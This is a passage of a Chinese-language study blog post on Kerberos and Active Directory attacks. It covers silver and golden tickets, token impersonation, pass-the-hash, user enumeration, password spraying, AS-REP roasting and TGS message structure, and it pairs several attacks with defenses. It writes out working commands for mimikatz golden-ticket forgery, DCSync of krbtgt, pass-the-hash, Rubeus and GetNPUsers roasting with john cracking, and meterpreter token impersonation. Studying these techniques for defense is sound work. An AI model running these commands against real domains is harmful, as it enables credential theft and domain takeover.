+<p>​    这个user用户名可以是假的，因为server是不会去验证的。</p>
+<p>​    由于白银票据需要目标服务器的Hash，所以没办法生成对应域内所有服务器的票据，也不能通过TGT申请。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p>
+<table>
+<thead>
+<tr>
+<th align="left">服务注释</th>
+<th align="left">服务名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">WMI</td>
+<td align="left">HOST、RPCSS</td>
+</tr>
+<tr>
+<td align="left">Powershell Remoteing</td>
+<td align="left">HOST、HTTP</td>
+</tr>
+<tr>
+<td align="left">WinRM</td>
+<td align="left">HOST、HTTP</td>
+</tr>
+<tr>
+<td align="left">Scheduled Tasks</td>
+<td align="left">HOST</td>
+</tr>
+<tr>
+<td align="left">LDAP 、<strong>DCSync</strong></td>
+<td align="left">LDAP</td>
+</tr>
+<tr>
+<td align="left">Windows File Share (CIFS)</td>
+<td align="left">CIFS</td>
+</tr>
+<tr>
+<td align="left">Windows Remote ServerAdministration Tools</td>
+<td align="left">RPCSS、LDAP、CIFS</td>
+</tr>
+</tbody></table>
+<h3 id="白银票据-Silver-Tickets-防御"><a href="#白银票据-Silver-Tickets-防御" class="headerlink" title="白银票据(Silver Tickets)防御"></a>白银票据(Silver Tickets)防御</h3><ul>
+<li>1.尽量保证服务器凭证不被窃取</li>
+<li>2.开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。</li>
+</ul>
+<p>开启方式:</p>
+<p>将注册表中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM \ CurrentControlSet\Control\Lsa\Kerberos\Parameters</span><br></pre></td></tr></table></figure>
+
+<p>中的<code>ValidateKdcPacSignature</code>设置为1。</p>
+<h3 id="黄金票据-Golden-Tickets"><a href="#黄金票据-Golden-Tickets" class="headerlink" title="黄金票据(Golden Tickets)"></a>黄金票据(Golden Tickets)</h3><p>黄金票据特点:</p>
+<ul>
+<li>1.需要与DC通信</li>
+<li>2.需要krbtgt用户的hash</li>
+</ul>
+<p><strong>PS:这里的krbtgt hash就是之前讲的KDC Hash</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-071528.png"
+                      alt="image-20230423151527534"
+                ></p>
+<h3 id="黄金票据-Golden-Tickets-MSF-kiwi"><a href="#黄金票据-Golden-Tickets-MSF-kiwi" class="headerlink" title="黄金票据(Golden Tickets)-MSF kiwi"></a>黄金票据(Golden Tickets)-MSF kiwi</h3><p>​    使用meterpreter中的kiwi模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure>
+
+<p>​    创建票据：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-071908.png"
+                      alt="image-20230423151907722"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-072003.png"
+                      alt="image-20230423152003005"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-072212.png"
+                      alt="image-20230423152211682"
+                ></p>
+<p>使用wmic在目标服务器上创建一个进程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-072341.png"
+                      alt="image-20230423152341215"
+                ></p>
+<h3 id="黄金票据-Golden-Tickets-伪造"><a href="#黄金票据-Golden-Tickets-伪造" class="headerlink" title="黄金票据(Golden Tickets) - 伪造"></a>黄金票据(Golden Tickets) - 伪造</h3><p>伪造票据:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Tickets-总结"><a href="#Tickets-总结" class="headerlink" title="Tickets 总结"></a>Tickets 总结</h3><ul>
+<li>黄金票据:从攻击面来看，获取krbtgt用户的hash后，可以在域中进行持久性的隐藏，并且日志无法溯源，但是需要拿到DC权限， 使用黄金票据能够在一个域环境中长时间控制整个域。</li>
+<li>从防御角度来看，需要经常更新krbtgt的密码，才能够使得原有的票据失效。最根本的办法是不允许域管账户登录其他服务器。</li>
+<li>白银票据:从攻击面来看，伪造白银票据的难度比伪造黄金票据的 难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵， 并且容易被转储Server。</li>
+<li>从防御角度来看，需要开启PAC认证，但这会降低认证效率，增加 DC的负担，最根本的还是要加固服务器本身对外的服务。</li>
+</ul>
+<h2 id="Windows-Access-Token"><a href="#Windows-Access-Token" class="headerlink" title="Windows Access Token"></a>Windows Access Token</h2><h3 id="Windows-Access-Token-简介"><a href="#Windows-Access-Token-简介" class="headerlink" title="Windows Access Token 简介"></a>Windows Access Token 简介</h3><p>​    Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。</p>
+<p>​    Access Token种类：</p>
+<ul>
+<li>主令牌</li>
+<li>模拟令牌</li>
+</ul>
+<p>​    一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的Access Token。</p>
+<p>​    <strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。</strong></p>
+<h3 id="Windows-Access-Token组成"><a href="#Windows-Access-Token组成" class="headerlink" title="Windows Access Token组成"></a>Windows Access Token组成</h3><ul>
+<li>用户帐户的安全标识符(SID)</li>
+<li>用户所属的组的SID</li>
+<li>用于标识当前登录会话的登录SID</li>
+<li>用户或用户组所拥有的权限列表</li>
+<li>所有者SID</li>
+<li>主要组的SID</li>
+<li>访问控制列表</li>
+<li>访问令牌的来源</li>
+<li>令牌是主要令牌还是模拟令牌</li>
+<li>限制SID的可选列表</li>
+<li>目前的模拟等级</li>
+<li>其他统计数据</li>
+</ul>
+<h3 id="Windows-Access-Token-–-SID-Security-Identifiers-安全标识符"><a href="#Windows-Access-Token-–-SID-Security-Identifiers-安全标识符" class="headerlink" title="Windows Access Token – SID (Security Identifiers)安全标识符"></a>Windows Access Token – SID (Security Identifiers)安全标识符</h3><p>安全标识符是一个唯一的字符串，它可以代表一个账户、一个用户 组、或者是一次登录。通常它还有一个SID固定列表，例如 Everyone这种已经内置的账户，默认拥有固定的SID</p>
+<p>SID的表现形式:</p>
+<ul>
+<li>域SID-用户ID</li>
+<li>计算机SID-用户ID</li>
+<li>SID列表都会存储在域控的AD或者计算机本地账户数据库中。</li>
+</ul>
+<h3 id="Windows-Access-Token产生过程"><a href="#Windows-Access-Token产生过程" class="headerlink" title="Windows Access Token产生过程"></a>Windows Access Token产生过程</h3><p>每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreateProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。</p>
+<h3 id="Windows-Access-Token令牌假冒实战"><a href="#Windows-Access-Token令牌假冒实战" class="headerlink" title="Windows Access Token令牌假冒实战"></a>Windows Access Token令牌假冒实战</h3><p><strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。</strong></p>
+<p>可以使用多种工具查看目前系统上存在的模拟令牌:</p>
+<ul>
+<li>Incognito</li>
+<li>Powershell - Invoke-TokenManipulation.ps1</li>
+<li>Cobalt Strike - steal_token</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; load incognito meterpreter &gt; list_tokens –u</span><br><span class="line">Delegation Tokens Available ============================== NT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEM PAYLOADS\Administrator PAYLOADS\w7</span><br><span class="line">meterpreter &gt; impersonate_token &quot;PAYLOADS\\Administrator”</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user PAYLOADS\Administrator</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-075028.png"
+                      alt="image-20230423155028271"
+                ></p>
+<h3 id="Windows-Access-Token令牌假冒防御"><a href="#Windows-Access-Token令牌假冒防御" class="headerlink" title="Windows Access Token令牌假冒防御"></a>Windows Access Token令牌假冒防御</h3><p>禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。</p>
+<p>如果想清除假冒令牌，重启服务器即可。</p>
+<h2 id="From-倾旋"><a href="#From-倾旋" class="headerlink" title="From 倾旋"></a>From 倾旋</h2><p>上面的大部分来源于倾旋大佬，跟着大佬学习，我进行了一些图片标注并且部分地方加入了自己的理解。光看大佬们的博客真的不够，很多一样的东西自己写自己理解感觉也是不一样的。下面我会再补充一些其他的，将各路大佬的资料和我自己的内容整合</p>
+<h2 id="Kerberos篇补充"><a href="#Kerberos篇补充" class="headerlink" title="Kerberos篇补充"></a>Kerberos篇补充</h2><h3 id="Kerberos流程再复习"><a href="#Kerberos流程再复习" class="headerlink" title="Kerberos流程再复习"></a>Kerberos流程再复习</h3><p>​    在Kerberos协议中主要是有三个角色的存在：</p>
+<ol>
+<li>访问服务的Client(以下表述为Client 或者用户)</li>
+<li>提供服务的Server(以下表述为服务)</li>
+<li>KDC（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</li>
+</ol>
+<p>​    其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-091548.png"
+                      alt="image-20230423171548298"
+                ></p>
+<ol>
+<li><p>AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</p>
+</li>
+<li><p>AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。</p>
+</li>
+<li><p>TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</p>
+</li>
+<li><p>TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</p>
+</li>
+<li><p>AP_REQ: Client拿着TGS票据去请求服务</p>
+</li>
+<li><p>AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</p>
+</li>
+</ol>
+<p>​    注意：这个和上面的详细流程有略微不同哦，因为PAC的原因</p>
+<h3 id="AS-REQ-amp-AS-REP引出的问题"><a href="#AS-REQ-amp-AS-REP引出的问题" class="headerlink" title="AS_REQ &amp; AS_REP引出的问题"></a>AS_REQ &amp; AS_REP引出的问题</h3><h4 id="1-Pass-the-hash"><a href="#1-Pass-the-hash" class="headerlink" title="1. Pass the hash"></a>1. Pass the hash</h4><p>​    上面NTLM的时候讲过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::ekeys</span><br><span class="line">sekurlsa::pth /user:testadmin /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-用户名枚举"><a href="#2-用户名枚举" class="headerlink" title="2. 用户名枚举"></a>2. 用户名枚举</h4><p>​    当我们在AS_REQ Body里的用户名不正确时，AS_error的回显是不一样的</p>
+<p>​    用户名存在，密码错误的情况下用户名存在，密码错误的情况下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-030143.png"
+                      alt="image-20230424110143768"
+                ></p>
+<p>​    用户名不存在的情况下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-030234.png"
+                      alt="image-20230424110234477"
+                ></p>
+<p>​    工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary/gather/kerberos_enumusers</span><br><span class="line">java –jar kerbguess.jar –r [domain] –d [user list] –s [DC IP]</span><br><span class="line">nmap –p 88 –script-args krb5-enum-users.realm=&#x27;[domain]&#x27;,userdb=[user list] [DC IP]</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-Password-Spraying"><a href="#3-Password-Spraying" class="headerlink" title="3. Password Spraying"></a>3. Password Spraying</h4><p>​    对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p>
+<p>密码正确：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-031020.png"
+                      alt="image-20230424111020033"
+                ></p>
+<p>密码错误：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-031038.png"
+                      alt="image-20230424111038159"
+                ></p>
+<h4 id="4-AS-REP-Roasting"><a href="#4-AS-REP-Roasting" class="headerlink" title="4. AS-REP Roasting"></a>4. AS-REP Roasting</h4><p>​    对于域用户，如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令。</p>
+<p>​    <strong>利用前提：域用户设置了选项”Do not require Kerberos preauthentication”。通常情况下，该选项默认不会开启。</strong></p>
+<p>​    如果看过我的语雀或者对域有一定了解，我在这里说明一下后面会讲到的三种攻击方式的区别：</p>
+<p><strong>·</strong>  AS-REP Roasting：获取用户hash然后离线暴力破解</p>
+<p><strong>·</strong>  Kerberoasting：获取应用服务hash然后暴力破解</p>
+<p><strong>·</strong>  黄金票据：通过假冒域中不存在的用户来访问应用服务</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-032139.png"
+                      alt="image-20230424112139182"
+                ></p>
+<p>​    在本地系统上，利用下面这条powershell命令，可以很容易遍历出哪些用户开启了“Do not require pre-authentication”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser -Filter &#x27;useraccountcontrol -band 4194304&#x27; -Properties useraccountcontrol | Format-Table name</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-032700.png"
+                      alt="image-20230424112659768"
+                ></p>
+<p>工具：</p>
+<ol>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus" >https://github.com/GhostPack/Rubeus<i class="fas fa-external-link-alt"></i></a></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure>
+
+<p>下载完成后，运行上面这条命令，会得到用户账户的hash值，这个key值用于加密时间戳。将这个值保存下来进行离线爆破密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-033341.png"
+                      alt="image-20230424113340885"
+                ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast /format:john /outfile: hashes.txt</span><br></pre></td></tr></table></figure>
+
+<p>这条命令会将提取到的hash值存储到一个txt文件中，存储格式是John这款工具可以破解的格式。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-033449.png"
+                      alt="image-20230424113448660"
+                ></p>
+<ol start="2">
+<li>GetNPUsers.py这个脚本是Impacket工具套件中的其中一个，它可以列举出哪些用户设置了“Do not require Kerberos pre-authentication”，并获得TGTs。同样的，你也可以保存hash到文件中，然后利用John the ripper进行破解，如下图：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py -dc-ip 192.168.1.105 ignite.local/ -usersfile users.txt -format john -outputfile hashes</span><br><span class="line">john –wordlist=/usr/share/wordlists/rockyou.txt hashes</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-033848.png"
+                      alt="img"
+                ></p>
+<h4 id="5-黄金票据"><a href="#5-黄金票据" class="headerlink" title="5. 黄金票据"></a>5. 黄金票据</h4><p>​    前面讲过，在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的TGT票据。</p>
+<p>​    制作金票需要先导出来krbtgt的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.local /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p>​    然后需要sid和krbtgt的hash，这里生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash，可以用mimikatz “lsadump::lsa /patch”导出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:test.local /sid:S-1-5-21-514356739-3204155868-1239341419 /aes256:b4e2924c2d378eda457c2dd3810fdde0a5312354c2b26bc677dfb48e46a17fe7 /user:administrator /ticket:gold.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-055538.png"
+                      alt="image-20230424135537902"
+                ></p>
+<p>​    然后我们使用这张票据就可以随意在某一台机器上ptt访问dc了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-055608.png"
+                      alt="image-20230424135608724"
+                ></p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="getTGT"><a href="#getTGT" class="headerlink" title="getTGT"></a>getTGT</h5><p>​    给定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache。这里面需要注意的是用mimikatz，kekeo，rubeus生成的凭据是以<code>.kirbi</code>后缀的。impacket 生成的凭据的后缀是<code>.ccache</code>。</p>
+<p>​    可以通过<a class="link"   target="_blank" rel="noopener" href="https://github.com/rvazarkar/KrbCredExport.git%E9%87%8C%E9%9D%A2%E7%9A%84%E8%84%9A%E6%9C%AC%E8%BD%AC%E5%8C%96%E4%B8%BAkirbi" >https://github.com/rvazarkar/KrbCredExport.git里面的脚本转化为kirbi<i class="fas fa-external-link-alt"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-060238.png"
+                      alt="image-20230424140237311"
+                ></p>
+<h5 id="GetNPUsers"><a href="#GetNPUsers" class="headerlink" title="GetNPUsers"></a>GetNPUsers</h5><p>​    上面介绍了</p>
+<h5 id="ticketer"><a href="#ticketer" class="headerlink" title="ticketer"></a>ticketer</h5><p>​    该脚本将从零开始或基于模板（从KDC合法请求）创建Golden / Silver票据，允许您自定义PAC_LOGON_INFO结构中设置的一些参数，特别是组，ExtraSids，持续时间等，票据格式是<code>ccache</code>.</p>
+<p>​    首先获取krbtgt的hash首先获取krbtgt的hash</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-060616.png"
+                      alt="image-20230424140616301"
+                ></p>
+<p>​    获取域的sid获取域的sid</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-060633.png"
+                      alt="image-20230424140632981"
+                ></p>
+<p>​    制作黄金票据制作黄金票据</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-060704.png"
+                      alt="image-20230424140704064"
+                ></p>
+<h5 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h5><p>​    上面已介绍</p>
+<h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><h6 id="kerberos-golden"><a href="#kerberos-golden" class="headerlink" title="kerberos::golden"></a>kerberos::golden</h6><p>mimikatz的kerberos::golden模块可以用于制作黄金票据,票据格式是<code>.kirbi</code></p>
+<p>首先获取krbtgt的hash</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-061001.png"
+                      alt="image-20230424141001031"
+                ></p>
+<p>获取域的sid</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-061028.png"
+                      alt="image-20230424141027830"
+                ></p>
+<p>制作黄金票据</p>
+<h5 id="DomainPasswordSpray"><a href="#DomainPasswordSpray" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h5><p>​    DomainPasswordSpray是用PowerShell编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用LDAP从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-061200.png"
+                      alt="image-20230424141200032"
+                ></p>
+<h3 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h3><p>​    在TGS_REQ &amp; TGS_REP阶段，用户通过AS_REP拿到的TGT票据，去向KDC申请特定服务的访问权限，KDC校验TGT票据，如果校验通过的话，会向用户发送一个TGS票据，之后用户再拿着TGS去访问特定的服务。这一阶段，微软引进了两个扩展S4U2SELF和S4U2PROXY。考虑到这两个扩展是TGS的子协议。</p>
+<p>​    TGS_REQ这个阶段不需要账号密码，需要AS_REP获取到的TGT凭据。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-064312.png"
+                      alt="image-20230424144311853"
+                ></p>
+<h4 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h4><h5 id="1-msg-type"><a href="#1-msg-type" class="headerlink" title="1. msg-type"></a>1. msg-type</h5><p>​    类型，TGS_REQ对应的就是KRB_TGS_REQ(0x0c)类型。</p>
+<h5 id="2-PA-DATA"><a href="#2-PA-DATA" class="headerlink" title="2. PA-DATA"></a>2. PA-DATA</h5><p>​    正常的TGS_REQ的请求需要用到有</p>
+<p>​    1）AP_REQ</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-064918.png"
+                      alt="image-20230424144918503"
+                ></p>
+<p>这个是TGS_REQ必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据，就放在这个结构体里面。</p>
+<p>KDC校验TGT票据，如果票据正确，就返回TGS票据。</p>
+<p>​    2）PA_FPR_USER</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-065453.png"
+                      alt="image-20230424145452156"
+                ></p>
+<p>类型是S4U2SELF，值是一个唯一的标识符，该标识符指示用户的身份。该唯一标识符由用户名和域名组成。</p>
+<p>S4U2proxy 必须扩展PA_FOR_USER结构，指定服务代表某个用户(图片里面是administrator)去请求针对服务自身的kerberos服务票据。</p>
+<p>​    3） PA_PAC_OPTIONS</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-023109.png"
+                      alt="image-20230425103109026"
+                ></p>
+<p>​    类型是PA_PAC_OPTIONS</p>
+<p>​    值是以下flag的组合</p>
+<p>​    – Claims(0)</p>
+<p>​    – Branch Aware(1)</p>
+<p>​    – Forward to Full DC(2)</p>
+<p>​    – Resource-based Constrained Delegation (3)</p>
+<p>​    S4U2proxy 必须扩展PA-PAC-OPTIONS结构。S4U2proxy 必须扩展PA-PAC-OPTIONS结构。</p>
+<p>​    <strong>如果是基于资源的约束委派，就需要指定Resource-based Constrained Delegation位。</strong></p>
+<h5 id="3-REQ-BODY"><a href="#3-REQ-BODY" class="headerlink" title="3. REQ_BODY"></a>3. REQ_BODY</h5><p>1）sname</p>
+<p>这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。</p>
+<p>2）AddtionTicket</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-023820.png"
+                      alt="image-20230425103819930"
+                ></p>
+<p>附加票据，在S4U2proxy请求里面，既需要正常的TGT，也需要S4U2self阶段获取到的TGS，那么这个TGS就添加到AddtionTicket里面。</p>
+<h4 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-024847.png"
+                      alt="image-20230425104847317"
+                ></p>
+<h5 id="1-msg-type-1"><a href="#1-msg-type-1" class="headerlink" title="1. msg-type"></a>1. msg-type</h5><p>AS_REQ的响应body对应的就是KRB_TGS_REQ(0x0d)</p>
+<h5 id="2-ticket"><a href="#2-ticket" class="headerlink" title="2. ticket"></a>2. ticket</h5><p>这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash。</p>
+<h5 id="3-Enc-part"><a href="#3-Enc-part" class="headerlink" title="3. Enc_part"></a>3. Enc_part</h5><p>这个enc_part不是ticket里面的enc_part！</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-025438.png"
+                      alt="image-20230425105438253"
+                ></p>
+<p>​    这部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的 session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-030021.png"
+                      alt="image-20230425110021441"
+                ></p>
